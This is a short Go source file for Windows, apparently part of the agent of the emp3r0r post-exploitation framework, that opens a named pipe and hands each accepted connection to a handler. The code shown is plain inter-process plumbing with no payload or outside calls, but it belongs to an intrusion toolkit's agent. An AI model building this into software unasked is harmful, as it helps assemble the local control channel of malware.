//go:build windows
// +build windows

package main

import (
	"fmt"
	"log"

	"github.com/Microsoft/go-winio"
	"github.com/jm33-m0/emp3r0r/core/internal/agent/common"
)

func socketListen() {
	pipe_config := &winio.PipeConfig{
		SecurityDescriptor: "",
		MessageMode:        true,
		InputBufferSize:    1024,
		OutputBufferSize:   1024,
	}
	ln, err := winio.ListenPipe(
		fmt.Sprintf(`\\.\pipe\%s`, common.RuntimeConfig.SocketName),
		pipe_config)
	if err != nil {
		log.Fatalf("Listen on %s: %v", common.RuntimeConfig.SocketName, err)
	}

	for {
		conn, err := ln.Accept()
		if err != nil {
			log.Printf("Accept: %v", err)
			continue
		}
		go socket_server(conn)
	}
}
